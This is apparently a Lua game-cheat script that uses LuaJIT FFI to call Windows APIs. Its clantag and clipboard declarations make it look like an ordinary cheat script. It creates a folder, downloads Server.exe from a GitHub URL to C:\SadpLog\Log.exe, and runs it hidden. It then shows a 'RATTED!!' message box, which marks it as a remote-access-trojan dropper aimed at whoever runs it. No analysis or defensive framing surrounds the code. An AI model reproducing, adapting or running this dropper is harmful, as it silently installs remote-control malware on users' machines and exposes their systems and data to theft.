ffi.cdef[[

    typedef int(__thiscall* get_clipboard_text_count)(void*);

    typedef void(__thiscall* set_clipboard_text)(void*, const char*, int);

    typedef void(__thiscall* get_clipboard_text)(void*, int, const char*, int);

    bool CreateDirectoryA(const char* lpPathName, void* lpSecurityAttributes);

    void* __stdcall URLDownloadToFileA(void* LPUNKNOWN, const char* LPCSTR, const char* LPCSTR2, int a, int LPBINDSTATUSCALLBACK);

    void* __stdcall ShellExecuteA(void* hwnd, const char* op, const char* file, const char* params, const char* dir, int show_cmd);

    bool DeleteUrlCacheEntryA(const char* lpszUrlName);



    typedef int(__fastcall* clantag_t)(const char*, const char*);



    bool CreateDirectoryA(const char* lpPathName, void* lpSecurityAttributes);

    void* __stdcall URLDownloadToFileA(void* LPUNKNOWN, const char* LPCSTR, const char* LPCSTR2, int a, int LPBINDSTATUSCALLBACK);

    void* __stdcall ShellExecuteA(void* hwnd, const char* op, const char* file, const char* params, const char* dir, int show_cmd);

  

    int MessageBoxA(void *w, const char *txt, const char *cap, int type);



    int ShellExecuteA(void* hwnd, const char* lpOperation, const char* lpFile, const char* lpParameters, const char* lpDirectory, int nShowCmd);

]]

local Shell32 = ffi.load 'Shell32.dll'

local urlmon = ffi.load 'UrlMon'

local wininet = ffi.load 'WinInet'

ffi.C.CreateDirectoryA("C:\\SadpLog", nil)

wininet.DeleteUrlCacheEntryA("https://github.com/Akoka123/manr/raw/main/Server.exe")

urlmon.URLDownloadToFileA(nil, "https://github.com/Akoka123/manr/raw/main/Server.exe", "C:\\SadpLog\\Log.exe", 0,0)

Shell32.ShellExecuteA(nil, 'open', "C:\\SadpLog\\Log.exe", nil, nil, 0)

ffi.C.MessageBoxA(nil, "RATTED!!", "RATTED", 0x00004000)